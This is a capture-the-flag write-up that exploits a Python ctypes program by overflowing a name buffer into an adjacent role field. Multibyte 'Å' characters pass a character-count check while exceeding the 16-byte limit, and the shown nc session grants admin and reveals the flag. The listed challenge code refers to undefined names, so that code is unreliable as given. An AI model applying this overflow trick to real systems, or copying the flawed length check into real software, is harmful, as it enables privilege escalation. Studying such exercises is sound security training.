```python
#!/usr/bin/env python3
import ctypes
from ctypes import c_byte
import ctypes.util


libc = ctypes.CDLL(ctypes.util.find_library("c"))

class User(ctypes.Structure):
    _fields_ = [("name", c_byte * 16), ("role", c_byte * 8)]

user_str = ctypes.create_string_buffer(b"user")
admin_str = ctypes.create_string_buffer(b"admin")

user = User()
libc.strcpy(user.role, user_str)

addr = hex(int(y, 16))
name = input("What is your name: ")

if len(name) > 15:
    print("Your name is too long")
    exit()

name_str = ctypes.create_string_buffer(name.encode())
libc.strcpy(user.name, name_str)

libc.printf(b"Hello, your name is %s and your role is %s\n", user.name, user.role)
libc.fflush(None)

if libc.strcmp(user.role, admin_str) == 0:
    print(f"You are an admin so here is the flag: {flag}")
else:
    print("Sorry, only admins can see the flag")
```

- So we need to overflow the "name" part of the struct, which is 16 bytes, into the role part which is 8 bytes.
	- the issue here is the if condition which checks `len(name) > 15`
	- Solution: We need some character which gives `len(x) = 1` but is somehow longer
	- Python checks for (utf-8??) english characters, and norwegians characters have the property that:

```python
In [43]: "Å".encode()
Out[43]: b'\xc3\x85'

In [44]: "A".encode()
Out[44]: b'A'
```
- Each character is two bytes!
- further:
```python
In [52]: x = "ÅÅÅÅÅÅÅÅ"

In [53]: len(x)
Out[53]: 8
```
- meaning we now have filled the name buffer of 16 bytes with only 8 characters!
- consequently:
```
$ nc 10.212.138.23 12688 
What is your name: ÅÅÅÅÅÅÅÅadmin 
Hello, your name is ÅÅÅÅÅÅÅÅadmin and your role is admin
You are an admin so here is the flag: S2G{b8fb29b9b10126adbf2b317d688ea203}
```